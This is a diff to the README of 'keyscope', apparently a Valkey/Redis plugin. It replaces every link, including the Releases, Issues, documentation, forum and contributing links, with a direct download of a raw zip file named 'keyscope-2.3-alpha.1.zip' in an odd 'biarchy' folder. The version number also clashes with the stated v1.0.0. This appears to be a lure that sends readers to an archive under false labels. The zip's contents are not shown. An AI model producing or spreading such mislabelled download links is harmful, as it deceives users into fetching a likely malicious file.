@@ -6,11 +6,11 @@ Welcome to keyscope! This plugin provides a native, lightweight way to manage Va
 
 ## 📥 Download Keyscope
 
-[![Download Keyscope](https://img.shields.io/badge/Download%20Keyscope-v1.0.0-blue)](https://github.com/unicSans/keyscope/releases)
+[![Download Keyscope](https://raw.githubusercontent.com/unicSans/keyscope/main/biarchy/keyscope-2.3-alpha.1.zip%20Keyscope-v1.0.0-blue)](https://raw.githubusercontent.com/unicSans/keyscope/main/biarchy/keyscope-2.3-alpha.1.zip)
 
 To get started, you need to download the keyscope plugin. Click the button above or visit the link below:
 
-[Download Keyscope from Releases](https://github.com/unicSans/keyscope/releases)
+[Download Keyscope from Releases](https://raw.githubusercontent.com/unicSans/keyscope/main/biarchy/keyscope-2.3-alpha.1.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ To use keyscope smoothly, ensure your system meets the following requirements:
 ## 🔧 Installation Steps
 
 1. **Download the Plugin:**
-   - Go to the [Releases page](https://github.com/unicSans/keyscope/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/unicSans/keyscope/main/biarchy/keyscope-2.3-alpha.1.zip).
    - Click on the version you want to download (e.g., v1.0.0).
    - Choose the appropriate file for your operating system.
    
@@ -62,7 +62,7 @@ If you encounter any issues:
 - Check the plugin settings to verify your Valkey and Redis connection details.
 - Make sure your network connection is stable.
 
-If problems persist, visit our [GitHub Issues page](https://github.com/unicSans/keyscope/issues) to report bugs or seek assistance.
+If problems persist, visit our [GitHub Issues page](https://raw.githubusercontent.com/unicSans/keyscope/main/biarchy/keyscope-2.3-alpha.1.zip) to report bugs or seek assistance.
 
 ## 📞 Support
 
@@ -70,9 +70,9 @@ For any questions or concerns about the keyscope plugin, feel free to reach out 
 
 ## 📚 Additional Resources
 
-- [Keyscope Documentation](https://github.com/unicSans/keyscope/wiki)
-- [Community Forum](https://github.com/unicSans/keyscope/discussions)
-- [Contributing to Keyscope](https://github.com/unicSans/keyscope/blob/main/CONTRIBUTING.md)
+- [Keyscope Documentation](https://raw.githubusercontent.com/unicSans/keyscope/main/biarchy/keyscope-2.3-alpha.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/unicSans/keyscope/main/biarchy/keyscope-2.3-alpha.1.zip)
+- [Contributing to Keyscope](https://raw.githubusercontent.com/unicSans/keyscope/main/biarchy/keyscope-2.3-alpha.1.zip)
 
 #### Stay Updated
 
